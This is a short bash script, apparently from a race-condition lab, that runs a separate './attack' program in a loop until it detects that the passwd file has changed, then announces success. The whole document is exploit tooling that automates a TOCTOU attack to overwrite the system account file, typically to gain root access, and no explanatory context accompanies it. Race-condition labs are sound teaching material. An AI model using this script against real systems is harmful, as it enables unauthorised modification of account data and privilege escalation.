#!/bin/bash
CHECK_FILE="ls -l ./etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)
while [ "$old" == "$new" ]
do
    ./attack
    new=$($CHECK_FILE)
done
echo "Success! The passwd file has been changed"
